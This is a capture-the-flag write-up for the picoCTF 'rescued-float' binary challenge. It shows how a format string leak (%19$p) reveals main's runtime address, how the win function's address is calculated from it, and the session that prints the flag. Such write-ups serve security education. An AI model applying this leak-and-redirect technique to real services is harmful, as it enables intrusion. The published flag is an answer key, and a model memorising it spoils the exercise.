Author: Darkraicg492
Description
Can you try to get the flag? I'm not revealing anything anymore!!  
Connect to the program with netcat:
`$ nc rescued-float.picoctf.net 61703`

The program's source code can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/5d0dc187b2341934a48bfcc3cbb13f67720777a5c968c57e95f45826427ea816/vuln.c).
The binary can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/5d0dc187b2341934a48bfcc3cbb13f67720777a5c968c57e95f45826427ea816/vuln).

<details><summary>Hint 1</summary>
What vulnerability can be exploited to leak the address?
</details>  
<details><summary>Hint 2</summary>
Please be mindful of the size of pointers in this binary
</details>

## Solution

```
> nm vuln
-------snip-------
                 U fgets@@GLIBC_2.2.5
                 U fopen@@GLIBC_2.2.5
00000000000012a0 t frame_dummy
0000000000001400 T main
                 U printf@@GLIBC_2.2.5
                 U putchar@@GLIBC_2.2.5
                 U puts@@GLIBC_2.2.5
0000000000001220 t register_tm_clones
00000000000012a9 T segfault_handler
                 U setvbuf@@GLIBC_2.2.5
                 U signal@@GLIBC_2.2.5
0000000000004020 B stdin@@GLIBC_2.2.5
0000000000004010 B stdout@@GLIBC_2.2.5
000000000000136a T win
```

`main` to `win` in address is -150.
Since there's a format string vulnerability, we can use `%n$p` where `n` is the nth stack.
in runtime, `main` address should ends with `4??`, and this can be seen in the 19th leaked address.
By setting the address to end in `400`, we can get the start of main,
and therefore we can calculate `win` relative to it by substracting 150.
Below is the worked solution: note that `0x60c790615400 - 150 == 0x60c79061536a`.

```
> nc rescued-float.picoctf.net 64483
Enter your name:%19$p
0x60c790615441
 enter the address to jump to, ex => 0x12345: 0x60c79061536a
You won!
picoCTF{p13_5h0u1dn'7_134k_4f15e15f}
```

Flag: `picoCTF{p13_5h0u1dn'7_134k_4f15e15f}`
